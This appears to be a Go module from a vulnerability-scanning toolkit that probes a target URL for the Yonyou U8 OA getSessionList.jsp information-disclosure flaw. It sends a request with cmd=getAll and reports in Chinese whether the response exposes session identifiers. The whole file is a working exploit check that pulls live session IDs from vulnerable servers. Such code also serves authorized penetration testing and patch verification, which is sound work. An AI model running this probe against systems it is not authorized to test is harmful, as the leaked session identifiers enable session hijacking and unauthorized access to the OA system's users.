package U8_OA_getSessionList

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
)

import (
	"io/ioutil"
	"regexp"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest()
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(url)
	if err != nil {
		color.Red.Println("[-] 请求失败或用友 U8 OA getSessionList.jsp 信息泄漏漏洞不存在")
		return
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-] 读取响应体失败")
		return
	}

	// 正则表达式匹配至少10个连续的字母数字字符
	identifierPattern := regexp.MustCompile(`\w{10,}`)
	if resp.StatusCode == 200 && identifierPattern.Find(body) != nil {
		color.Green.Println("[+] 用友 U8 OA getSessionList.jsp 信息泄漏漏洞存在 -> " + url)
		return
	}

	color.Red.Println("[-] 用友 U8 OA getSessionList.jsp 信息泄漏漏洞不存在")
}
